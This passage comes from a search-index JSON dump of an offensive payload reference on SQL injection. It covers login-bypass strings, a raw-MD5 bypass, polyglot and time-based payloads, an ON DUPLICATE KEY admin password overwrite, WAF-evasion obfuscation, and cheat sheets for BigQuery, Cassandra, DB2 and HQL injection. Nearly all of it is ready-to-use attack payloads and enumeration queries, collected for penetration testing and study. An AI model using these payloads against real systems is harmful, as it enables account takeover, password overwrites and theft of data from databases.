(\"x\")=(\"x \")) or ((\"x\"))=((\"x or 2 like 2 or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' -- - admin' # admin'/* admin' or '2' LIKE '1 admin' or 2 LIKE 2-- admin' or 2 LIKE 2# admin') or 2 LIKE 2# admin') or 2 LIKE 2-- admin') or ('2' LIKE '2 admin') or ('2' LIKE '2'# admin') or ('2' LIKE '2'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin\" -- admin';-- azer admin\" # admin\"/* admin\" or \"1\"=\"1 admin\" or \"1\"=\"1\"-- admin\" or \"1\"=\"1\"# admin\" or \"1\"=\"1\"/* admin\"or 1=1 or \"\"=\" admin\" or 1=1 admin\" or 1=1-- admin\" or 1=1# admin\" or 1=1/* admin\") or (\"1\"=\"1 admin\") or (\"1\"=\"1\"-- admin\") or (\"1\"=\"1\"# admin\") or (\"1\"=\"1\"/* admin\") or \"1\"=\"1 admin\") or \"1\"=\"1\"-- admin\") or \"1\"=\"1\"# admin\") or \"1\"=\"1\"/* 1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055","title":"Authentication bypass"},{"location":"SQL%20Injection/#authentication-bypass-raw-md5-sha1","text":"When a raw md5 is used, the pass will be queried as a simple string, not a hexstring. \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\" Allowing an attacker to craft a string with a true statement such as ' or 'SOMETHING md5(\"ffifdyop\", true) = 'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c sha1(\"3fDf \", true) = Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-! Challenge demo available at http://web.jarvisoj.com:32772","title":"Authentication Bypass (Raw MD5 SHA1)"},{"location":"SQL%20Injection/#polyglot-injection-multicontext","text":"SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ /* MySQL only */ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/","title":"Polyglot injection (multicontext)"},{"location":"SQL%20Injection/#routed-injection","text":"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'","title":"Routed injection"},{"location":"SQL%20Injection/#insert-statement-on-duplicate-key-update","text":"ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by: Inject using payload: attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- The query would look like this: INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- \", \"bcrypt_hash_of_your_password_input\"); This query will insert a row for the user \u201cattacker_dummy@example.com\u201d. It will also insert a row for the user \u201cadmin@example.com\u201d. Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \"bcrypt_hash_of_qwerty\". After this, we can simply authenticate with \u201cadmin@example.com\u201d and the password \u201cqwerty\u201d!","title":"Insert Statement - ON DUPLICATE KEY UPDATE"},{"location":"SQL%20Injection/#waf-bypass","text":"","title":"WAF Bypass"},{"location":"SQL%20Injection/#white-spaces-alternatives","text":"No Space (%20) - bypass using whitespace alternatives ?id=1%09and%091=1%09-- ?id=1%0Dand%0D1=1%0D-- ?id=1%0Cand%0C1=1%0C-- ?id=1%0Band%0B1=1%0B-- ?id=1%0Aand%0A1=1%0A-- ?id=1%A0and%A01=1%A0-- No Whitespace - bypass using comments ?id=1/*comment*/and/**/1=1/**/-- No Whitespace - bypass using parenthesis ?id=(1)and(1)=(1)-- Whitespace alternatives by DBMS | DBMS | ASCII characters in hexadicimal | | ---- | ------------------------------- | | SQLite3 | 0A, 0D, 0C, 09, 20 | | MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 | | MySQL 3 | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 | | PostgreSQL | 0A, 0D, 0C, 09, 20 | | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 | | MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 | Example of query where spaces were replaced by ascii characters above 0x80 \u2640SELECT\u00a7*\u2302FROM\u263ausers\u266bWHERE\u26421\u263c=\u00b61\u203c","title":"White spaces alternatives"},{"location":"SQL%20Injection/#no-comma","text":"Bypass using OFFSET, FROM and JOIN LIMIT 0,1 -> LIMIT 1 OFFSET 0 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1). SELECT 1,2,3,4 -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d","title":"No Comma"},{"location":"SQL%20Injection/#no-equal","text":"Bypass using LIKE/NOT IN/IN/BETWEEN ?id=1 and substring(version(),1,1)like(5) ?id=1 and substring(version(),1,1)not in(4,3) ?id=1 and substring(version(),1,1)in(4,3) ?id=1 and substring(version(),1,1) between 3 and 4","title":"No Equal"},{"location":"SQL%20Injection/#case-modification","text":"Bypass using uppercase/lowercase (see keyword AND) ?id=1 AND 1=1# ?id=1 AnD 1=1# ?id=1 aNd 1=1# Bypass using keywords case insensitive / Bypass using an equivalent operator AND -> && OR -> || = -> LIKE,REGEXP, BETWEEN, not < and not > > X -> not between 0 and X WHERE -> HAVING","title":"Case modification"},{"location":"SQL%20Injection/#obfuscation-by-dbms","text":"MySQL 1.UNION SELECT 2 3.2UNION SELECT 2 1e0UNION SELECT 2 SELECT\\N/0.e3UNION SELECT 2 1e1AND-0.0UNION SELECT 2 1/*!12345UNION/*!31337SELECT/*!table_name*/ {ts 1}UNION SELECT.`` 1.e.table_name SELECT $.`` 1.e.table_name SELECT{_ .``1.e.table_name} SELECT LightOS . ``1.e.table_name LightOS SELECT information_schema 1337.e.tables 13.37e.table_name SELECT 1 from information_schema 9.e.table_name MSSQL .1UNION SELECT 2 1.UNION SELECT.2alias 1e0UNION SELECT 2 1e1AND-1=0.0UNION SELECT 2 SELECT 0xUNION SELECT 2 SELECT\\UNION SELECT 2 \\1UNION SELECT 2 SELECT 1FROM[table]WHERE\\1=\\1AND\\1=\\1 SELECT\"table_name\"FROM[information_schema].[tables] Oracle 1FUNION SELECT 2 1DUNION SELECT 2 SELECT 0x7461626c655f6e616d65 FROM all_tab_tables SELECT CHR(116) || CHR(97) || CHR(98) FROM all_tab_tables SELECT%00table_name%00FROM%00all_tab_tables","title":"Obfuscation by DBMS"},{"location":"SQL%20Injection/#more-mysql-specific","text":"information_schema.tables alternative select * from mysql.innodb_table_stats; +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ | database_name | table_name | last_update | n_rows | clustered_index_size | sum_of_other_index_sizes | +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ | dvwa | guestbook | 2017-01-19 21:02:57 | 0 | 1 | 0 | | dvwa | users | 2017-01-19 21:03:07 | 5 | 1 | 0 | ... +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ mysql> show tables in dvwa; +----------------+ | Tables_in_dvwa | +----------------+ | guestbook | | users | +----------------+ Version Alternative mysql> select @@innodb_version; +------------------+ | @@innodb_version | +------------------+ | 5.6.31 | +------------------+ mysql> select @@version; +-------------------------+ | @@version | +-------------------------+ | 5.6.31-0ubuntu0.15.10.1 | +-------------------------+ mysql> mysql> select version(); +-------------------------+ | version() | +-------------------------+ | 5.6.31-0ubuntu0.15.10.1 | +-------------------------+","title":"More MySQL specific"},{"location":"SQL%20Injection/#waf-bypass-for-mysql-using-scientific-notation","text":"Blocked ' or ''=' Working ' or 1.e('')=' Obfuscated query 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2","title":"WAF bypass for MySQL using scientific notation"},{"location":"SQL%20Injection/#references","text":"Detect SQLi Manual SQL Injection Discovery Tips NetSPI SQL Injection Wiki MySQL: PentestMonkey's mySQL injection cheat sheet Reiners mySQL injection Filter Evasion Cheatsheet Alternative for Information_Schema.Tables in MySQL The SQL Injection Knowledge base MSSQL: EvilSQL's Error/Union/Blind MSSQL Cheatsheet PentestMonkey's MSSQL SQLi injection Cheat Sheet ORACLE: PentestMonkey's Oracle SQLi Cheatsheet POSTGRESQL: PentestMonkey's Postgres SQLi Cheatsheet Others SQLi Cheatsheet - NetSparker Access SQLi Cheatsheet PentestMonkey's Ingres SQL Injection Cheat Sheet Pentestmonkey's DB2 SQL Injection Cheat Sheet Pentestmonkey's Informix SQL Injection Cheat Sheet SQLite3 Injection Cheat sheet Ruby on Rails (Active Record) SQL Injection Guide ForkBombers SQLMap Tamper Scripts Update SQLi in INSERT worse than SELECT Manual SQL Injection Tips Second Order: Analyzing CVE-2018-6376 \u2013 Joomla!, Second Order SQL Injection Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper Sqlmap: #SQLmap protip @zh4ck WAF: SQLi Optimization and Obfuscation Techniques by Roberto Salgado A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection","title":"References"},{"location":"SQL%20Injection/BigQuery%20Injection/","text":"Google BigQuery SQL Injection Summary Detection BigQuery Comment BigQuery Union Based BigQuery Error Based BigQuery Boolean Based BigQuery Time Based References Detection Use a classic single quote to trigger an error: ' Identify BigQuery using backtick notation: SELECT .... FROM `` AS ... # Gathering project id select @@project_id # Gathering all dataset names select schema_name from INFORMATION_SCHEMA.SCHEMATA # Gathering data from specific project id & dataset select * from `project_id.dataset_name.table_name` BigQuery Comment select 1#from here it is not working select 1/*between those it is not working*/ BigQuery Union Based UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name# true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name# true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name# ' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name# BigQuery Error Based # Error based - division by zero ' OR if(1/(length((select('a')))-1)=1,true,false) OR ' # Error based - casting: select CAST(@@project_id AS INT64) dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC# BigQuery Boolean Based ' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'# BigQuery Time Based Time based functions does not exist in the BigQuery syntax. References BigQuery SQL Injection Cheat Sheet - Ozgur Alp - Feb 14 BigQuery Documentation - Query Syntax BigQuery Documentation - Functions and Operators Akamai Web Application Firewall Bypass Journey: Exploiting \u201cGoogle BigQuery\u201d SQL Injection Vulnerability - By Duc Nguyen The, March 31, 2020","title":"Google BigQuery SQL Injection"},{"location":"SQL%20Injection/BigQuery%20Injection/#google-bigquery-sql-injection","text":"","title":"Google BigQuery SQL Injection"},{"location":"SQL%20Injection/BigQuery%20Injection/#summary","text":"Detection BigQuery Comment BigQuery Union Based BigQuery Error Based BigQuery Boolean Based BigQuery Time Based References","title":"Summary"},{"location":"SQL%20Injection/BigQuery%20Injection/#detection","text":"Use a classic single quote to trigger an error: ' Identify BigQuery using backtick notation: SELECT .... FROM `` AS ... # Gathering project id select @@project_id # Gathering all dataset names select schema_name from INFORMATION_SCHEMA.SCHEMATA # Gathering data from specific project id & dataset select * from `project_id.dataset_name.table_name`","title":"Detection"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-comment","text":"select 1#from here it is not working select 1/*between those it is not working*/","title":"BigQuery Comment"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-union-based","text":"UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name# true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name# true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name# ' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#","title":"BigQuery Union Based"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-error-based","text":"# Error based - division by zero ' OR if(1/(length((select('a')))-1)=1,true,false) OR ' # Error based - casting: select CAST(@@project_id AS INT64) dataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#","title":"BigQuery Error Based"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-boolean-based","text":"' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#","title":"BigQuery Boolean Based"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-time-based","text":"Time based functions does not exist in the BigQuery syntax.","title":"BigQuery Time Based"},{"location":"SQL%20Injection/BigQuery%20Injection/#references","text":"BigQuery SQL Injection Cheat Sheet - Ozgur Alp - Feb 14 BigQuery Documentation - Query Syntax BigQuery Documentation - Functions and Operators Akamai Web Application Firewall Bypass Journey: Exploiting \u201cGoogle BigQuery\u201d SQL Injection Vulnerability - By Duc Nguyen The, March 31, 2020","title":"References"},{"location":"SQL%20Injection/Cassandra%20Injection/","text":"Cassandra Injection Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system Summary Cassandra comment Cassandra - Login Bypass Login Bypass 0 Login Bypass 1 References Cassandra comment /* Cassandra Comment */ Cassandra - Login Bypass Login Bypass 0 username: admin' ALLOW FILTERING; %00 password: ANY Login Bypass 1 username: admin'/* password: */and pass>' The injection would look like the following SQL query SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING; References","title":"Cassandra Injection"},{"location":"SQL%20Injection/Cassandra%20Injection/#cassandra-injection","text":"Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system","title":"Cassandra Injection"},{"location":"SQL%20Injection/Cassandra%20Injection/#summary","text":"Cassandra comment Cassandra - Login Bypass Login Bypass 0 Login Bypass 1 References","title":"Summary"},{"location":"SQL%20Injection/Cassandra%20Injection/#cassandra-comment","text":"/* Cassandra Comment */","title":"Cassandra comment"},{"location":"SQL%20Injection/Cassandra%20Injection/#cassandra-login-bypass","text":"","title":"Cassandra - Login Bypass"},{"location":"SQL%20Injection/Cassandra%20Injection/#login-bypass-0","text":"username: admin' ALLOW FILTERING; %00 password: ANY","title":"Login Bypass 0"},{"location":"SQL%20Injection/Cassandra%20Injection/#login-bypass-1","text":"username: admin'/* password: */and pass>' The injection would look like the following SQL query SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;","title":"Login Bypass 1"},{"location":"SQL%20Injection/Cassandra%20Injection/#references","text":"","title":"References"},{"location":"SQL%20Injection/DB2%20Injection/","text":"DB2 Injection Summary DB2 Cheatsheet References DB2 Cheatsheet Version select versionnumber, version_timestamp from sysibm.sysversions; select service_level from table(sysproc.env_get_inst_info()) as instanceinfo select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+) select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo select service_level,bld_level from sysibmadm.env_inst_info Comments select blah from foo -- comment like this (double dash) Current User select user from sysibm.sysdummy1 select session_user from sysibm.sysdummy1 select system_user from sysibm.sysdummy1 List Users DB2 uses OS accounts select distinct(authid) from sysibmadm.privileges -- priv required select grantee from syscat.dbauth -- incomplete results select distinct(definer) from syscat.schemata -- more accurate select distinct(grantee) from sysibm.systabauth -- same as previous List Privileges select * from syscat.tabauth -- shows priv on tables select * from syscat.tabauth where grantee = current user -- shows privs for current user select * from syscat.dbauth where grantee = current user;; select * from SYSIBM.SYSUSERAUTH \u2014 List db2 system privilegies List DBA Accounts select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y' select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = \u2018Y\u2019 or SYSADMAUTH = \u2018G\u2019 Current Database select current server from sysibm.sysdummy1 List Databases select distinct(table_catalog) from sysibm.tables SELECT schemaname FROM syscat.schemata; List Columns select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat List Tables select table_name from sysibm.tables select name from sysibm.systables Find Tables From Column Name select tbname from sysibm.syscolumns where name='username' Select Nth Row select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only Select Nth Char select substr('abc',2,1) FROM sysibm.sysdummy1 -- returns b Bitwise AND/OR/NOT/XOR select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot ASCII Value Char select chr(65) from sysibm.sysdummy1 -- returns 'A' Char -> ASCII Value select ascii('A') from sysibm.sysdummy1 -- returns 65 Casting select cast('123' as integer) from sysibm.sysdummy1 select cast(1 as char) from sysibm.sysdummy1 String Concat select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- returns 'abc' select 'a' || 'b' from sysibm.sysdummy1 -- returns 'ab' IF Statement Seems only allowed in stored procedures. Use case logic instead. Case Statement select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1 Avoiding Quotes SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns \u201cADRI\u201d. Works without select too Time Delay Heavy queries, for example: If user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response. However, if user doesn't start with ascii 68, the heavy query won't execute and thus the response will be faster. ' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 Serialize to XML (for error based) select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(\u2026 AS varchar(500)) to display the result. Command Execution and Local File Access Seems it's only allowed from procedures or UDFs. Hostname/IP and OS INFO select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv Location of DB Files select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- requires priv System Config select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions. select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions. Default System Database SYSIBM SYSCAT SYSSTAT SYSPUBLIC SYSIBMADM SYSTOOLs References DB2 SQL injection cheat sheet - Adri\u00e1n - 20/05/2012 DB2 SQL Injection Cheat Sheet - pentestmonkey","title":"DB2 Injection"},{"location":"SQL%20Injection/DB2%20Injection/#db2-injection","text":"","title":"DB2 Injection"},{"location":"SQL%20Injection/DB2%20Injection/#summary","text":"DB2 Cheatsheet References","title":"Summary"},{"location":"SQL%20Injection/DB2%20Injection/#db2-cheatsheet","text":"","title":"DB2 Cheatsheet"},{"location":"SQL%20Injection/DB2%20Injection/#version","text":"select versionnumber, version_timestamp from sysibm.sysversions; select service_level from table(sysproc.env_get_inst_info()) as instanceinfo select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+) select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo select service_level,bld_level from sysibmadm.env_inst_info","title":"Version"},{"location":"SQL%20Injection/DB2%20Injection/#comments","text":"select blah from foo -- comment like this (double dash)","title":"Comments"},{"location":"SQL%20Injection/DB2%20Injection/#current-user","text":"select user from sysibm.sysdummy1 select session_user from sysibm.sysdummy1 select system_user from sysibm.sysdummy1","title":"Current User"},{"location":"SQL%20Injection/DB2%20Injection/#list-users","text":"DB2 uses OS accounts select distinct(authid) from sysibmadm.privileges -- priv required select grantee from syscat.dbauth -- incomplete results select distinct(definer) from syscat.schemata -- more accurate select distinct(grantee) from sysibm.systabauth -- same as previous","title":"List Users"},{"location":"SQL%20Injection/DB2%20Injection/#list-privileges","text":"select * from syscat.tabauth -- shows priv on tables select * from syscat.tabauth where grantee = current user -- shows privs for current user select * from syscat.dbauth where grantee = current user;; select * from SYSIBM.SYSUSERAUTH \u2014 List db2 system privilegies","title":"List Privileges"},{"location":"SQL%20Injection/DB2%20Injection/#list-dba-accounts","text":"select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y' select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = \u2018Y\u2019 or SYSADMAUTH = \u2018G\u2019","title":"List DBA Accounts"},{"location":"SQL%20Injection/DB2%20Injection/#current-database","text":"select current server from sysibm.sysdummy1","title":"Current Database"},{"location":"SQL%20Injection/DB2%20Injection/#list-databases","text":"select distinct(table_catalog) from sysibm.tables SELECT schemaname FROM syscat.schemata;","title":"List Databases"},{"location":"SQL%20Injection/DB2%20Injection/#list-columns","text":"select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat","title":"List Columns"},{"location":"SQL%20Injection/DB2%20Injection/#list-tables","text":"select table_name from sysibm.tables select name from sysibm.systables","title":"List Tables"},{"location":"SQL%20Injection/DB2%20Injection/#find-tables-from-column-name","text":"select tbname from sysibm.syscolumns where name='username'","title":"Find Tables From Column Name"},{"location":"SQL%20Injection/DB2%20Injection/#select-nth-row","text":"select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only","title":"Select Nth Row"},{"location":"SQL%20Injection/DB2%20Injection/#select-nth-char","text":"select substr('abc',2,1) FROM sysibm.sysdummy1 -- returns b","title":"Select Nth Char"},{"location":"SQL%20Injection/DB2%20Injection/#bitwise-andornotxor","text":"select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot","title":"Bitwise AND/OR/NOT/XOR"},{"location":"SQL%20Injection/DB2%20Injection/#ascii-value","text":"Char select chr(65) from sysibm.sysdummy1 -- returns 'A'","title":"ASCII Value"},{"location":"SQL%20Injection/DB2%20Injection/#char-ascii-value","text":"select ascii('A') from sysibm.sysdummy1 -- returns 65","title":"Char -&gt; ASCII Value"},{"location":"SQL%20Injection/DB2%20Injection/#casting","text":"select cast('123' as integer) from sysibm.sysdummy1 select cast(1 as char) from sysibm.sysdummy1","title":"Casting"},{"location":"SQL%20Injection/DB2%20Injection/#string-concat","text":"select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- returns 'abc' select 'a' || 'b' from sysibm.sysdummy1 -- returns 'ab'","title":"String Concat"},{"location":"SQL%20Injection/DB2%20Injection/#if-statement","text":"Seems only allowed in stored procedures. Use case logic instead.","title":"IF Statement"},{"location":"SQL%20Injection/DB2%20Injection/#case-statement","text":"select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1","title":"Case Statement"},{"location":"SQL%20Injection/DB2%20Injection/#avoiding-quotes","text":"SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns \u201cADRI\u201d. Works without select too","title":"Avoiding Quotes"},{"location":"SQL%20Injection/DB2%20Injection/#time-delay","text":"Heavy queries, for example: If user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response. However, if user doesn't start with ascii 68, the heavy query won't execute and thus the response will be faster. ' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68","title":"Time Delay"},{"location":"SQL%20Injection/DB2%20Injection/#serialize-to-xml-for-error-based","text":"select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(\u2026 AS varchar(500)) to display the result.","title":"Serialize to XML (for error based)"},{"location":"SQL%20Injection/DB2%20Injection/#command-execution-and-local-file-access","text":"Seems it's only allowed from procedures or UDFs.","title":"Command Execution and Local File Access"},{"location":"SQL%20Injection/DB2%20Injection/#hostnameip-and-os-info","text":"select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv","title":"Hostname/IP and OS INFO"},{"location":"SQL%20Injection/DB2%20Injection/#location-of-db-files","text":"select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- requires priv","title":"Location of DB Files"},{"location":"SQL%20Injection/DB2%20Injection/#system-config","text":"select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions. select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions.","title":"System Config"},{"location":"SQL%20Injection/DB2%20Injection/#default-system-database","text":"SYSIBM SYSCAT SYSSTAT SYSPUBLIC SYSIBMADM SYSTOOLs","title":"Default System Database"},{"location":"SQL%20Injection/DB2%20Injection/#references","text":"DB2 SQL injection cheat sheet - Adri\u00e1n - 20/05/2012 DB2 SQL Injection Cheat Sheet - pentestmonkey","title":"References"},{"location":"SQL%20Injection/HQL%20Injection/","text":"Hibernate Query Language Injection Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database. - Wikipedia Summary HQL Comments HQL List Columns HQL Error Based Single Quote Escaping $-quoted strings DBMS Magic functions Unicode Java constants Methods by DBMS References HQL Comments HQL does not support comments HQL List Columns from BlogPosts where title like '%' and DOESNT_EXIST=1 and ''='%' -- and published = true Using an unexisting column will an exception leaking several columns names. org.hibernate.exception.SQLGrammarException: Column \"DOESNT_EXIST\" not found; SQL statement: select blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159] HQL Error Based from BlogPosts where title like '%11' and (select password from User where username='admin')=1 or ''='%' and published = true Error based on value casting. Data conversion error converting \"d41d8cd98f00b204e9800998ecf8427e\"; SQL statement: select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1 :warning: HQL does not support UNION queries Single Quote Escaping Method works for MySQL DBMS which escapes SINGLE QUOTES in strings with SLASH \\' . In HQL SINGLE QUOTES is escaped in strings by doubling '' . 'abc\\''or 1=(select 1)--' In HQL it is a string, in MySQL it is a string and additional SQL expression. $-quoted strings Method works for DBMS which allow DOLLAR-QUOTED strings in SQL expressions: PostgreSQL, H2. Hibernate ORM allows identifiers starting with $$ . $$='$$=concat(chr(61),chr(39)) and 1=1--' DBMS Magic functions Method works for DBMS which have MAGIC FUNCTIONS which evaluate SQL expression in string parameter: PostgreSQL, Oracle. Hibernate allows to specify any function name in HQL expression. PostgreSQL has built-in function query_to_xml('Arbitrary SQL') . array_upper(xpath('row',query_to_xml('select 1 where 1337>1', true, false,'')),1) Oracle has built-in function DBMS_XMLGEN.getxml('SQL') NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1' Unicode Method works for DBMS which allow UNICODE delimiters (Ex. U+00A0) between SQL tokens: Microsoft SQL Server, H2. In Microsoft SQL SERVER SELECT LEN([U+00A0](select[U+00A0](1)) works the same as SELECT LEN((SELECT(1))) ; HQL allows UNICODE symbols in identifiers (function or parameter names). SELECT p FROM hqli.persistent.Post p where p.name='dummy' or 1<LEN( (select top 1 name from users)) or '1'='11' Java constants Method works for most DBMS (does not work for MySQL). Hibernate resolves Java public static fields (Java constants) in HQL queries: Class with Java constant must be in classpath Ex. java.lang.Character.SIZE is resolved to 16 String or char constants are additionally surrounded by single quotes To use JAVA CONSTANTS method we need special char or string fields declared in classes or interfaces on classpath. public class Constants { public static final String S_QUOTE = \"'\"; public static final String HQL_PART = \"select * from Post where name = '\"; public static final char C_QUOTE_1 = '\\''; public static final char C_QUOTE_2 = '\\047'; public static final char C_QUOTE_3 = 39; public static final char C_QUOTE_4 = 0x27; public static final char C_QUOTE_5 = 047; } Some usable constants in well-known Java libraries: 